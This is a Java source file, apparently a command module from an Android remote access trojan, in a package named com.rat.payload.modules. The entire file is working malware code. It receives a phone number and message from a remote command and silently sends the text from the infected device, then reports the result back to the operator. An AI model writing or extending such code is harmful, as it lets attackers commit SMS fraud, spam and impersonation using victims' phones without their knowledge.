package com.rat.payload.modules;

import android.content.Context;
import android.telephony.SmsManager;

import org.json.JSONObject;

public class SendSMS implements CommandHandler.Command {

    private Context context;

    public SendSMS(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public JSONObject execute(JSONObject args) {
        JSONObject result = new JSONObject();
        try {
            String number = args.getString("number");
            String message = args.getString("message");
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
            result.put("sent", true);
            result.put("to", number);
        } catch (Exception e) {
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }
}
